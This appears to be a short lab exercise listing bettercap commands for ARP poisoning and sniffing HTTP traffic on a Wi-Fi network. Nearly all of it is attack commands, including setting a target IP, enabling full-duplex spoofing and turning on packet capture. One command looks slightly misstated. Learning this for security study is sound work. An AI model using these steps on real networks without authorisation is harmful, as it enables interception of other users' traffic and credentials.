Perform network Spoofing and Sniffing using ARP Poisoning using 
bettercap. Perform Below operation  
1)Capturing packets 
2)show the data being captured of HTTP protocol 

Command 1 - Selecting the interface of wlan0 i.e Wi-Fi. 
bettercap  -iface wlan0 

Command 2 – this command shows all the devices that are connected 
to the same network 
net.show 

Command 3–help provides with the Modules of bettercap with their status  

Command 4- net.probe on 
This will send various probe packets to each IP in order and in the present subnet

Command 5-set arp.spoof.fullduplex true 
In order to attack both the targets and the gateway, we will have to set 
arp.spoof.fullduplex to true. 

Command 6- set arp.spoof.targets 192.168.43.77(IP address of the 
target Device) 
Set the target to the IP you can add any number of IPs here by using “,”. For 
example 192.168.43.77 

Command 7-set arp.spoof on 
Start the ARP spoofer 

Command 8- set net.sniff.local true 
Setting it to true will consider packets from/to this computer, otherwise it will skip 
them. 

Command 9 - net.sniff on 
Turning on the sniffing and catching the packets. 
